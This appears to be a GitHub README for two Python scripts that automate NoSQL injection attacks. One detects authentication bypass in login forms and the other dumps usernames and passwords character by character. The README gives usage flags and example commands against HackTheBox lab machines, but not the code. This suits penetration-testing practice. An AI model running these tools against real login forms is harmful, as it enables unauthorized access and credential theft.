# NoSQL-Attack-Suite
A couple of different scripts, made to automate attacks against NoSQL databases.
The first one looks for a NoSQL Auth Bypass in login forms, while the other one can be used to dump credentials from the database if a NoSQL Auth Bypass is possible. These scripts have been tested on Mango and NodeBlog machines from HackTheBox (HTB).
Thanks to [@IppSec](https://github.com/IppSec) and [@an0nlk](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) for giving me ideas about these scripts.

## nosql-login-bypass.py
### Description
This script checks for GET,POST and JSON encoded POST requests to find a possible NoSQL Auth Bypass. For every type of request it injects a "template" invalid credential and an Auth Bypass Payload. Then it compares both status code and body of the responses to find discrepancies.

### Usage
```
usage: ./nosql-login-bypass.py [-h] [-t T] [-u U] [-p P] [-o O]
optional arguments:
  -h, --help  show this help message and exit
  -t T        Target URL
  -u U        Username parameter
  -p P        Password parameter
  -o O        Other parameters, separated by comma
```
### Example
```
./nosql-login-bypass.py -t http://staging-order.mango.htb -u username -p password -o "login=login"
```
The result will express if the login's form is vulnerable to the attack, and in particular for which type of request.


## nosql-login-enum.py
### Description
This script dumps credentials from the database, character by character.
To make this script work, you need to specify the vulnerable request, the response's code and a string from the response's body of an Auth Bypass correctly done.

### Usage
```
usage: ./nosql-login-enum.py [-h] [-t T] [-u U] [-p P] [-o O] [-m M] [-c C] [-s S] [--json]
optional arguments:
  -h, --help  show this help message and exit
  -t T        Target URL
  -u U        Username parameter
  -p P        Password parameter
  -o O        Other parameters, separated by comma
  -m M        Mode: GET or POST
  -c C        Response's code for correct injection
  -s S        Response's string for correct injection
  --json      Json encoded POST request
```

### Example
```
./nosql-login-enum.py -t http://10.10.11.139/login -u user -p password -m POST -c 200 -s "UHC" --json
```
This will dump usernames and passwords from the database.


## Notes
If there is any problem, feel free to send your pull requests :)
